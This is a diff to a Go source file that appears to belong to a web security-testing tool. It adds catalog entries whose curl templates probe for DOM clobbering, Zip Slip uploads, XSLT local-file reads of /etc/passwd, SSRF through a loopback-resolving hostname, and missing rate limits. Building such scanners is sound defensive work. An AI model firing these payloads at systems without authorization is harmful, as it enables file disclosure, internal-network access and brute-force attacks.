@@ -595,4 +595,69 @@ var catalog = []Technique{
 			},
 		},
 	},
+	// ── DOM Clobbering ────────────────────────────────────────────────────────
+	{
+		Category:      "dom_clobbering",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-xss.html",
+		Description:   "Probe for unsanitised HTML injection that permits named-element global overwrite (DOM Clobbering).",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=<a id=abh_domclob name=abh_domclob><a id=abh_domclob name=abh_domclob href=//abh-domclob.invalid>", "-i"},
+				Description:  "Reflect same-id/name anchor elements to test for named-element global clobbering",
+			},
+		},
+	},
+	// ── Zip Slip ──────────────────────────────────────────────────────────────
+	{
+		Category:      "zip_slip",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/file-upload/index.html",
+		Description:   "Upload an archive whose entry name contains a directory-traversal sequence (Zip Slip).",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "-F", "file=@zipslip.zip", "{{TARGET}}", "-i"},
+				Description:  "Upload a ZIP archive containing a ../ traversal entry name",
+			},
+		},
+	},
+	// ── XSLT Injection ────────────────────────────────────────────────────────
+	{
+		Category:      "xslt_injection",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html",
+		Description:   "Submit a crafted XSLT stylesheet abusing document() to read local files or trigger SSRF.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "-X", "POST", "{{TARGET}}", "-H", "Content-Type: application/xml", "--data-binary", "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><abh><xsl:value-of select=\"document('file:///etc/passwd')\"/></abh></xsl:template></xsl:stylesheet>"},
+				Description:  "POST an XSLT stylesheet with a document() local-file-read call",
+			},
+		},
+	},
+	// ── SSRF DNS Rebinding ────────────────────────────────────────────────────
+	{
+		Category:      "dns_rebinding",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html",
+		Description:   "Test SSRF-prone URL parameters with public hostnames that resolve to loopback/internal IPs.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "-X", "POST", "{{TARGET}}", "-d", "url=http://127.0.0.1.nip.io/", "-i"},
+				Description:  "Submit a loopback-resolving public hostname to a URL-bearing parameter",
+			},
+		},
+	},
+	// ── Rate Limit / Brute Force ──────────────────────────────────────────────
+	{
+		Category:      "rate_limit",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/login-bypass/index.html",
+		Description:   "Fire a bounded burst of requests at a sensitive endpoint to check for missing throttling/lockout.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "-o", "/dev/null", "-w", "%{http_code}\\n", "-X", "POST", "{{TARGET}}", "-d", "email=abh_ratelimit_probe@abh-test.invalid"},
+				Description:  "Send a repeated POST to observe whether HTTP 429/423 or Retry-After ever appears",
+			},
+		},
+	},
 }
